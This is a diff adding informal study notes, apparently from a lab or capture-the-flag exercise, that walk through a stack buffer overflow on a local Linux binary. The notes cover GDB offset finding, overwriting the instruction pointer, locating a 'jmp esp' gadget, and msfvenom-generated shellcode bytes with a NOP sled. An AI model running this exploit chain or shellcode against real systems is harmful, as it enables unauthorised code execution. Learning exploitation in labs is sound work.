@@ -1,0 +1,129 @@
+
+
+  GDB COMMANDS
+disass <FUNCTION>   #   Disassemble portion of the program
+info <...>  #   Supply info for specific stack areas
+x/256c $<REGISTER>  #   Read characters from specific register
+break <address>  #   Establish a break point
+
+
+demo
+
+strings ./<exec>
+gdb ./<exec>
+
+run - runs executable
+
+check if it takes arguments
+
+run <<<$(echo "asdfasdfasdf") - check to see if you can redirect input 
+ 
+info functions - check for vulnerable functions
+
+pdisass main - using the peda function to disassemble the main function
+
+pdisass <func> - if a function turns up red, the function is vulnerable
+
+script to make buffer
+  #!/usr/bin/env python
+
+buffer = "A" * 90
+
+print(buffer)
+
+----
+go to wiremask.eu / tools /pattern
+grab string of charcters
+
+#buffer = "A" * 90
+buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
+
+input instruction pointer registry value into wiremask
+------
+buffer = "A" * 62
+eip = "BBBB"
+
+print(buffer+eip)
+
+-------
+
+find memory locations for jumpesp
+
+run gdb without peda
+
+env - gdb ./func
+show env
+unset env <EVERY VARIABLE ONE AT A TIME>
+
+run
+enter string long enough for overflow
+
+info proc map
+1st address after heap
+0xf7de1000
+
+0xffffe000
+end address of stack
+stack is in between 0xf7de1000 and 0xffffe000
+
+find /b 0xf7de1000, 0xffffe000, 0xff, 0xe4
+    start of stack/end of stack jump   esp
+
+grab 1st 4 address
+break the address into bytes
+flip the address, last byte is now first byte
+
+change eip to 1st flipped address
+
+new term:msfvenom -p linux/x86/exec CMD=<CMDIWANT> -b '\x00' -f python
+copy shell code paste in python script bellow buffer 
+add nop above shell code
+
+-----
+
+nop ="\x90" * 15
+ 
+buf =  b""
+buf += b"\xdb\xcd\xd9\x74\x24\xf4\xbe\xa3\xb8\xb8\xf9\x5a"
+buf += b"\x33\xc9\xb1\x0a\x31\x72\x19\x83\xea\xfc\x03\x72"
+buf += b"\x15\x41\x4d\xd2\xf2\xdd\x37\x71\x63\xb5\x6a\x15"
+buf += b"\xe2\xa2\x1d\xf6\x87\x44\xde\x60\x47\xf6\xb7\x1e"
+buf += b"\x1e\x15\x15\x37\x23\xd9\x9a\xc7\x4d\xbd\x9a\x90"
+buf += b"\xde\xb4\x7a\xd3\x61"
+
+-------
+
+msfvenom --list payloads
+
+./func <<<$(python <script>) may not work
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
